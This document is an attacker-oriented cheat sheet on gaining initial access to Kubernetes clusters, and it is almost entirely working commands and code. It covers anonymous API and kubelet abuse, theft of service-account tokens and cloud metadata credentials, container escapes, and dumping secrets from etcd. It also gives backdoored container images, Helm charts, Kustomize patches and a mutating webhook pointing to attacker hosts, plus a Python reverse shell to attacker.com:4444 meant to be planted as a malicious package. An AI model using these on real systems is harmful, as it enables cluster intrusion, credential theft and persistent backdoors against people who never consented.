# Kubernetes Initial Access

Techniques for obtaining initial access to Kubernetes clusters.

## Unauthenticated API Access

### Exposed Kubernetes API Server

```bash
# Check if API server is exposed without authentication
curl -k https://kubernetes.default:443/api/v1

# If exposed, enumerate cluster
curl -k https://kubernetes.default:443/api/v1/namespaces

# Get nodes
curl -k https://kubernetes.default:443/api/v1/nodes

# List pods across cluster
curl -k https://kubernetes.default:443/api/v1/pods?fieldSelector=metadata.namespace!=kube-system

# Get secrets
curl -k https://kubernetes.default:443/api/v1/secrets

# Common vulnerabilities:
# - API server listening on 0.0.0.0
# - Anonymous authentication enabled
# - No RBAC enforcement
```

### Kubelet Anonymous Access

```bash
# Kubelet often exposes API on port 10250
# Check if anonymous access allowed
curl -k https://localhost:10250/api/v1/nodes

# Enumerate pods on node
curl -k https://localhost:10250/pods

# Get pod details
curl -k https://localhost:10250/pods | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace}'

# Access pod logs
curl -k https://localhost:10250/logs/
curl -k https://localhost:10250/logs/kubelet.log

# Execute commands in containers
curl -X POST -k https://localhost:10250/run/default/pod-name/container-name \
  -d 'cmd=id'

# Read files from running containers
curl -k https://localhost:10250/logs/../../../var/log/container/app.log
```

## Service Account Token Disclosure

### Token in Environment Variables

```bash
# Check for Kubernetes tokens in environment
env | grep -i token

# Kubernetes service account token location
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token to access API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CA_CRT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -H "Authorization: Bearer $TOKEN" \
  --cacert $CA_CRT \
  https://kubernetes.default.svc.cluster.local/api/v1/namespaces/$NAMESPACE/pods

# Token often allows:
# - Reading pods in namespace
# - Accessing secrets
# - Executing commands in containers
```

### Service Account Token in Logs

```bash
# Kubernetes logs may contain service account tokens
# Check various log locations

find /var/log -name "*.log" -type f -exec grep -l "token\|secret\|Bearer" {} \;

# Check container logs
kubectl logs {pod} -c {container}

# Look in application logs for token references
grep -r "authorization\|bearer\|token" /var/log/app/

# Check Kubernetes event logs
kubectl describe pod {pod}

# Tokens in YAML files
find / -name "*.yaml" -o -name "*.yml" | xargs grep -l "serviceAccountToken"
```

## Pod Escape Vulnerabilities

### Container Runtime Escape

```bash
# Check for vulnerable runtime configurations
docker version

# CVE-2019-5736 - runc vulnerability
# If vulnerable version, escape container

# Exploit privileged container
docker run --privileged -it ubuntu /bin/bash

# Mount host filesystem
mount | grep -E "cgroup|cgroup2"

# Access host via cgroup
# If cgroup is mounted, can access host's processes
cat /host/etc/passwd

# Escape via volume mount
docker run -v /:/host -it ubuntu /bin/bash
# Now /host contains entire host filesystem

# Escape from privileged container to kernel
# Use kernel vulnerability or capabilities
```

### Kubelet Container Runtime Escape

```bash
# Check if kubelet is exposed and allows exec
curl -k https://localhost:10250/run/default/pod/container \
  -d 'cmd=/bin/bash&stdin=true&stdout=true&stderr=true&tty=true'

# Or use kubectl exec if credentials available
kubectl exec -it {pod} /bin/bash

# Check for privileged pods or pods with host access
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.securityContext.privileged==true)'

# Pods with privileged capabilities
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.capabilities.add[] == "SYS_ADMIN")'

# Pods with host network access
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.hostNetwork==true)'

# From privileged pod, escape to host
nsenter -t 1 -m -u -i /bin/bash  # Access host namespace
```

## Cloud Metadata Service Access

### GCP GKE Workload Identity

```bash
# From GKE pod, access GCP metadata
IDENTITY_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience={projectId}.iam.gserviceaccount.com)

# Exchange token for GCP credentials
curl -X POST https://sts.googleapis.com/v1/token \
  -H "Content-Type: application/json" \
  -d '{
    "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
    "audience": "//iam.googleapis.com/projects/{projectNumber}/locations/global/workloadIdentityPools/{pool}/providers/{provider}",
    "subject_token": "'${IDENTITY_TOKEN}'",
    "subject_token_type": "urn:ietf:params:oauth:token-type:jwt"
  }'

# Now you have GCP access from Kubernetes
# Use to access Cloud Storage, BigQuery, databases, etc.
```

### AWS EKS IAM Role

```bash
# From EKS pod, get AWS credentials via IAM role
ROLE_ARN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_ARN)

# Extract credentials
AWS_ACCESS_KEY=$(echo $CREDS | jq -r '.AccessKeyId')
AWS_SECRET_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
AWS_TOKEN=$(echo $CREDS | jq -r '.Token')

# Use to access AWS resources
aws s3 ls --access-key-id=$AWS_ACCESS_KEY --secret-access-key=$AWS_SECRET_KEY --session-token=$AWS_TOKEN
```

## Public Container Image Abuse

### Malicious Container in Registry

```bash
# If you can push to container registry
# Create container with backdoor

cat > Dockerfile << 'EOF'
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y openssh-server curl

RUN mkdir -p /root/.ssh
COPY id_rsa.pub /root/.ssh/authorized_keys

RUN service ssh start

# Backdoor entrypoint
CMD ["/bin/bash", "-c", "service ssh start && while true; do sleep 1000; done"]
EOF

docker build -t {registry}/backdoor:latest .
docker push {registry}/backdoor:latest

# If cluster pulls this image for deployment
# You have access via SSH backdoor
```

## Supply Chain Attacks

### Compromise Helm Chart

```bash
# If you can modify Helm chart repository
# Or create chart with backdoor

mkdir helm-backdoor
cd helm-backdoor
helm create backdoor

# Modify values.yaml to deploy backdoor container
cat > values.yaml << 'EOF'
image:
  repository: attacker.registry.com/backdoor
  tag: latest
EOF

# Modify templates to deploy backdoor pods
cat > templates/backdoor.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: system-monitor
  namespace: kube-system
spec:
  serviceAccountName: cluster-admin
  containers:
  - name: monitor
    image: attacker.registry.com/persistence:latest
EOF

# Create release
helm package .

# If cluster auto-updates Helm releases
# Backdoor deployed with admin access
```

### Compromise Kustomization

```bash
# Similar to Helm, Kustomize can deploy malicious manifests
# If you can modify kustomization.yaml

cat > kustomization.yaml << 'EOF'
resources:
  - deployment.yaml
  - service.yaml
  - backdoor-sa.yaml

patchesJson6902:
  - target:
      group: apps
      version: v1
      kind: Deployment
    patch: |-
      - op: add
        path: /spec/template/spec/initContainers
        value:
          - name: backdoor
            image: attacker.registry.com/init-backdoor:latest
            command: ["/install-backdoor.sh"]
EOF

# When kustomize is applied, backdoor deployed
kustomize build . | kubectl apply -f -
```

## etcd Exposure

### Direct etcd Access

```bash
# If etcd is exposed (usually port 2379)
# You can read all cluster data

ETCDCTL_API=3 etcdctl --endpoints=http://etcd-host:2379 get "" --prefix

# List all keys
ETCDCTL_API=3 etcdctl --endpoints=http://etcd-host:2379 get / --prefix

# Common sensitive data in etcd:
# - Secrets
# - Credentials
# - RBAC policies
# - Cluster configuration

# Get specific secret
ETCDCTL_API=3 etcdctl --endpoints=http://etcd-host:2379 \
  get /registry/secrets/default/db-password

# Get all secrets in namespace
ETCDCTL_API=3 etcdctl --endpoints=http://etcd-host:2379 \
  get /registry/secrets/production/ --prefix
```

### etcd Backup Access

```bash
# Backup files may be readable
# Check for etcd backup locations

find /var -name "*.backup" -o -name "etcd*"
find /opt -name "*.snapshot" -o -name "*.db"

# Restore etcd from backup
etcdctl snapshot restore {backup-file}

# Or access backup data directly
strings {backup-file} | grep -i "secret\|password"
```

## RBAC Misconfiguration

### Permissions for Default Service Account

```bash
# Check what default service account can do
kubectl auth can-i --list

# Check specific permissions
kubectl auth can-i get pods
kubectl auth can-i get secrets
kubectl auth can-i create pods

# If default SA has broad permissions
# You already have initial access

# Create pod with mounted secrets
cat > backdoor-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
spec:
  serviceAccountName: default
  containers:
  - name: backdoor
    image: ubuntu:22.04
    command: ["sleep"]
    args: ["999999"]
    volumeMounts:
    - name: secrets
      mountPath: /secrets
  volumes:
  - name: secrets
    secret:
      secretName: admin-credentials
EOF

kubectl apply -f backdoor-pod.yaml
kubectl exec -it backdoor -- cat /secrets/password
```

## Webhook/Admission Controller Abuse

### Mutating Webhook Injection

```bash
# If mutating webhook is present
# You might inject pods through it

cat > malicious-webhook.yaml << 'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: pod-modifier
webhooks:
- name: pod-modifier.attacker.com
  clientConfig:
    url: http://attacker.com:8080/mutate
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
EOF

# If you can create webhook config
# All pods pass through your webhook
# Inject containers, volumes, environment variables

# Webhook modifies pod to add:
# - Sidecar container with backdoor
# - Volume mount to secrets
# - Environment variables with tokens
```

## Supply Chain via Package Manager

```bash
# Compromise dependencies pulled by Kubernetes components
# Or dependencies in container images

# If you can intercept package downloads
# You can serve malicious packages

# Create malicious package
cat > backdoor/__init__.py << 'EOF'
import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket()
    s.connect(("attacker.com", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])

reverse_shell()
EOF

# If Kubernetes component imports your package
# Backdoor executes on startup
```

## RBAC to RCE

### Service Account with Pod Exec Permissions

```bash
# If service account can exec into pods
# You have command execution capability

# Check permissions
kubectl auth can-i exec pods
kubectl auth can-i create pods

# If you can exec and create pods
# You control the cluster

# Create privileged pod
kubectl run attacker-pod \
  --image=ubuntu \
  --overrides='{"spec":{"serviceAccountName":"admin-sa"}}'

# Exec into it
kubectl exec -it attacker-pod /bin/bash

# From privileged pod:
# - Access host via /host mount
# - Read node secrets
# - Modify cluster resources
```

## Compromised Node Access

### Gain Node Access

```bash
# If you compromise any pod on node
# You can escalate to node access

# From pod, check node name
echo $HOSTNAME  # Usually includes node name

# If you can create pods with nodeSelector
kubectl run -it attacker --image=ubuntu \
  --overrides='{"spec":{"nodeSelector":{"kubernetes.io/hostname":"target-node"}}}'

# From pod on target node
# Mount host filesystem
cat /proc/mounts | grep /var/lib/kubelet

# Access kubelet's data
ls -la /var/lib/kubelet/pods/
ls -la /var/lib/kubelet/secrets/

# Extract kubelet credentials
cat /var/lib/kubelet/kubeconfig.yaml
cat /var/lib/kubelet/pki/kubelet-client-current.pem
```
